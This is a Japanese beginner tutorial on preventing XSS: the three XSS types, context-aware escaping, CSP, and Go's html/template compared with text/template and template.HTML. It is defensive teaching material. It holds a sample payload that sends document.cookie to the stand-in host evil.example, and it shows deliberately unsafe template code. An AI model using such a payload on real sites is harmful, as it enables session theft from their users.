---
title: "XSS（クロスサイトスクリプティング） — 出力エスケープとCSPで防ぐ"
date: 2026-07-09T10:30:00
summary: "ユーザー入力を無害化せずにHTMLへ出力すると、攻撃者のスクリプトが被害者のブラウザで実行される。XSSの3類型と根本対策（文脈依存の出力エスケープ＋CSP）を整理し、Goの html/template が既定で守ってくれる仕組みと、その穴の開け方を押さえる。"
tags: ["セキュリティ", "Go"]
level: beginner
---

XSS（クロスサイトスクリプティング）は、**攻撃者の書いた JavaScript を被害者のブラウザで実行させる**
攻撃。原因はほぼ1つ——ユーザー由来の文字列を無害化せずに HTML へ埋め込むこと。
結論を先に言うと、**出力する場所（文脈）に合わせてエスケープし、CSP を保険で重ねる**。

## 攻撃の仕組み — 出力に混ぜ込まれるスクリプト

XSS の本体は、`<script>` などの HTML/JS として解釈される文字列が、
そのまま画面に描画されてしまうこと。混入経路で3類型に分かれる。

| 類型 | 混入経路 | 例 |
| --- | --- | --- |
| **反射型**（Reflected） | リクエスト → 即レスポンスに反射 | 検索語をそのままページに表示する |
| **蓄積型**（Stored） | DB などに保存 → 後で他人に配信 | コメント欄に仕込まれ、全閲覧者が被弾 |
| **DOM型**（DOM-based） | サーバを介さずJS が DOM を書き換える | `innerHTML = location.hash` |

たとえば検索キーワードを無エスケープで埋め込むページに、こう入力されると：

```text
"><script>fetch('https://evil.example/steal?c='+document.cookie)</script>
```

出力された HTML の中で `<script>` が本物のタグとして解釈され、
**被害者の Cookie（セッション）が攻撃者に送信される**。蓄積型なら、閲覧しただけの全員が対象になる。

> ⚠️ 危険なのは入力そのものではなく「**信用できない文字列をコードとして解釈できる場所に置く**」こと。
> これは[SQLインジェクション](/posts/sql-injection/)とまったく同じ構図で、
> 混ざる相手が SQL か HTML/JS かの違いにすぎない。

## 対策の原則 — 文脈依存のエスケープ ＋ CSP

第一原則は**出力時のエスケープ**。しかも埋め込む「場所」で正しい変換が変わる。

- **HTML 本文**: `<` → `&lt;`、`>` → `&gt;`、`&` → `&amp;` に変換する
- **属性値**: `"` `'` も含めてエスケープ（`href="..."` を割られない）
- **`<script>` 内・URL・CSS**: 文脈ごとに規則が違う。JS 文字列に HTML エスケープをかけても無意味

つまり「1回サニタイズすれば安全」ではなく、**出力する文脈ごとに正しくエスケープする**のが肝。
そのうえで**保険として CSP（Content-Security-Policy）**を重ねる。CSP はブラウザに
「どこから来たスクリプトを実行してよいか」を宣言するヘッダで、
エスケープ漏れが1か所あっても**インラインスクリプトの実行自体を止める**。

```text
Content-Security-Policy: default-src 'self'; script-src 'self'
```

## Goでの防御 — html/template は既定で守る

Go には似た名前の2つのテンプレートパッケージがある。ここが分かれ道。

- `text/template` … 文字列を**そのまま**埋める。エスケープしない
- `html/template` … 同じ API のまま、**出力文脈を自動判定してエスケープ**する

まず危ない例。`text/template` にユーザー入力を通すと、`<script>` が素通りする。

```go
// 危険: text/template はエスケープしない
package main

import (
	"os"
	"text/template"
)

func main() {
	t := template.Must(template.New("x").Parse(`<p>こんにちは {{.}} さん</p>`))
	// 攻撃者が送った文字列がそのまま HTML になる
	t.Execute(os.Stdout, `<script>alert(1)</script>`)
	// 出力: <p>こんにちは <script>alert(1)</script> さん</p>
}
```

インポートを `html/template` に変えるだけで安全になる。API は同一。

```go
// 安全: html/template が文脈に合わせて自動エスケープ
package main

import (
	"html/template"
	"os"
)

func main() {
	t := template.Must(template.New("x").Parse(`<p>こんにちは {{.}} さん</p>`))
	t.Execute(os.Stdout, `<script>alert(1)</script>`)
	// 出力: <p>こんにちは &lt;script&gt;alert(1)&lt;/script&gt; さん</p>
}
```

`html/template` の賢いところは**文脈を見て変換を切り替える**点。同じ `{{.}}` でも
HTML 本文なら HTML エスケープ、`href="{{.}}"` なら属性＋URLエスケープ、`<script>` 内なら JS
文字列エスケープ、と自動で使い分ける。原則で挙げた「文脈依存のエスケープ」を標準ライブラリが肩代わりする。

> 🧭 C#/ASP.NET の Razor も同じ発想で、`@model.Name` は既定で HTML エンコードされる。
> エンコードを外すには `@Html.Raw(...)` と明示する——Go の `template.HTML` に対応する「危険な逃げ道」。

## 逃げ道は明示的に、CSPは保険として

`html/template` で「自分でエスケープ済みだから生 HTML を通したい」ときは、
`template.HTML` などの**特別な型**でラップする。これは**エスケープを外す明示的な宣言**で、
XSS の最頻出の入口でもある。

```go
// template.HTML はエスケープ対象から外れる。信頼できる値だけに使う
safe := template.HTML(myTrustedSnippet)     // OK: 自分で生成した固定HTML
danger := template.HTML(userInput)          // NG: ユーザー入力を包むと即XSS
```

> 💡 ルールは単純。`template.HTML` / `Html.Raw` は**ユーザー由来の値には絶対に使わない**。
> 使う場面はほぼ「自分が組み立てた信頼できる HTML 片」に限る。

CSP ヘッダは Go でも普通のミドルウェアで付けられる。エスケープを主対策、CSP を保険にする多層防御。

```go
func csp(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self'")
		next.ServeHTTP(w, r)
	})
}
```

## まとめ

- XSS は**信用できない文字列を HTML/JS として解釈させる**攻撃。反射型・蓄積型・DOM型の3類型
- 根本対策は**出力時の文脈依存エスケープ**。「1回サニタイズ」ではなく出力する場所ごとに正しく変換する
- Go は `text/template`（エスケープしない）と `html/template`（文脈判定して自動エスケープ）で明暗が分かれる。**Webページ生成は必ず `html/template`**
- `template.HTML` はエスケープを外す逃げ道。**ユーザー入力には絶対使わない**（Razor の `@Html.Raw` と同じ注意）
- **CSP を保険**に重ね、エスケープ漏れがあってもインラインスクリプトを止める多層防御にする

**関連:** [CSRF — 意図しないリクエストを踏ませる攻撃](/posts/csrf-attack/) / [SQLインジェクション](/posts/sql-injection/) / [セッションハイジャックとセッション固定](/posts/session-hijacking-fixation/)
